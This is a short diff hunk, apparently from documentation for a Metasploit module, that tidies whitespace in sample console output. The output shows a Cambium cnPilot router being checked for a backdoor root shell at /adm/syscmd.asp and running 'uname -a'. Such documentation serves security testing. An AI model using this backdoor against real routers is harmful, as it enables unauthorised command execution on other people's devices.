@@ -23,10 +23,10 @@ msf auxiliary(cnpilot_r_cmd_exec) > run
 [*] 1.3.3.7:80 - Checking backdoor 'root' shell...
 [+] 1.3.3.7:80 - You can access the 'root' shell at: http://1.3.3.7:80/adm/syscmd.asp
 [+] 1.3.3.7:80 - Executing command - uname -a
-[+] 
+[+]
 Linux cnPilot-R201 2.6.36 #1 Thu Feb 9 03:02:39 CST 2017 mips unknown
 
-        
+
 [+] File saved in: /root/.msf4/loot/20000000000003_default_1.3.3.7_cmdexeclog_12345.txt
 [*] Scanned 1 of 1 hosts (100% complete)
 [*] Auxiliary module execution completed
